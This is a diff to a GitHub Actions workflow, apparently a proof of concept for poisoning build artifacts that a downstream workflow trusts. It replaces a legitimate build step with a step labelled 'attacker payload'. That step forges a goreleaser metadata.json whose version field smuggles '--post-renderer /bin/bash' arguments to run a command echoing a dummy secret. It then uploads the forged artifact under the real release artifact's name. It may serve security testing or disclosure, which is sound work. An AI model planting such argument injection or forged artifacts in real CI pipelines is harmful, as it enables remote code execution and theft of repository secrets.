@@ -2,8 +2,6 @@ name: GAB NRDOT Upstream
 on:
   pull_request:
     branches: [main]
-  push:
-    branches: [main]
 
 permissions:
   contents: read
@@ -12,5 +10,20 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: legit build
-        run: echo "LEGIT_UPSTREAM_RAN"
+      - name: attacker payload replacing legit build
+        env:
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+        run: |
+          echo "ATTACKER_UPSTREAM_RAN head_sha=$HEAD_SHA"
+          mkdir -p art/dist
+          cat > art/dist/metadata.json <<'JSON'
+          {"version":"1.0.0 --post-renderer /bin/bash --post-renderer-args -c --post-renderer-args echo${IFS}GAB_RCE_PROOF_$GAB_DUMMY_SECRET","commit":"deadbeefcafe1234"}
+          JSON
+          printf '[{"type":"Docker Manifest","extra":{"Digest":"a"}}]\n' > art/dist/artifacts.json
+          echo "--- forged metadata.json ---"
+          cat art/dist/metadata.json
+      - name: Upload forged build artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: goreleaser_output_nrdot-collector_${{ github.event.pull_request.head.sha }}
+          path: art
